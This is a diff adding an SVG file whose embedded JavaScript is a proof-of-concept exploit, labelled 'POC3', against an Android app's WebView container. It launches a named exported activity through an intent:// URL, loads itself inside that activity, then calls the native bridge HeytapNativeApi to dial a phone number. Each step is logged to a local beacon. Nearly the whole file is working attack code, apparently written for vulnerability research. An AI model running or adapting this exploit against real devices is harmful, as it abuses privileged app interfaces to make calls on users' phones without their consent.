@@ -1,0 +1,48 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 660 900">
+  <rect width="100%" height="100%" fill="#ffffff"/>
+  <g font-family="monospace" font-size="14" fill="#000000">
+    <text x="8" y="22">POC3 — WebExt container: common.call (DIAL) from attacker page</text>
+    <text id="l1" x="8" y="52"/>
+    <text id="l2" x="8" y="72"/>
+    <text id="l3" x="8" y="92"/>
+    <text id="l4" x="8" y="112"/>
+    <text id="l5" x="8" y="132"/>
+    <text id="l6" x="8" y="152"/>
+    <text id="l7" x="8" y="172"/>
+    <text id="l8" x="8" y="192"/>
+  </g>
+  <script type="text/javascript"><![CDATA[
+  var lines = [], MAX = 8;
+  function paint(){ for (var i=0;i<MAX;i++){ var e=document.getElementById('l'+(i+1)); if(e) e.textContent = lines[i]||''; } }
+  function put(s){ if (lines.length>=MAX) lines.shift(); lines.push(s); paint(); }
+  function beacon(k,v){ try{ new Image().src='http://127.0.0.1:8899/beacon?k='+encodeURIComponent('dial.'+k)
+    +'&v='+encodeURIComponent(String(v).slice(0,300))+'&r='+Math.random(); }catch(e){} }
+  function log(k,v){ put(k+' = '+String(v).slice(0,90)); beacon(k,v); }
+
+  var stage = (location.search.indexOf('stage=B')>=0) ? 'B' : 'A';
+  log('stage', stage); log('href', location.href);
+
+  if (stage === 'A') {
+    setTimeout(function(){
+      var self = location.href.split('#')[0].split('?')[0];
+      var it = 'intent://launch#Intent;component=com.heytap.games.forum/'
+        + 'com.platform.usercenter.ac.webview.ui.AccountWebExtActivity;'
+        + 'S.key_web_url=' + self + '?stage=B&v=' + Date.now() + ';end';
+      log('firing intent ->', 'AccountWebExtActivity');
+      try { location.href = it; } catch(e){ log('intent_ERR', e); }
+    }, 700);
+  } else {
+    setTimeout(function(){
+      window.HeytapJsApi = { callback: function(id,obj){ log('cb:'+id, JSON.stringify(obj)); },
+                             broadcastReceiver: function(n,o){ log('bc:'+n, JSON.stringify(o)); } };
+      var api = window.HeytapNativeApi;
+      log('typeof HeytapNativeApi', typeof api);
+      var num = '13800138000';
+      try {
+        var r = api.invoke('common.call', JSON.stringify({number: num}), 'c_dial');
+        log('common.call(' + num + ')', r);
+      } catch(e){ log('common.call_ERR', e); }
+    }, 900);
+  }
+  ]]></script>
+</svg>
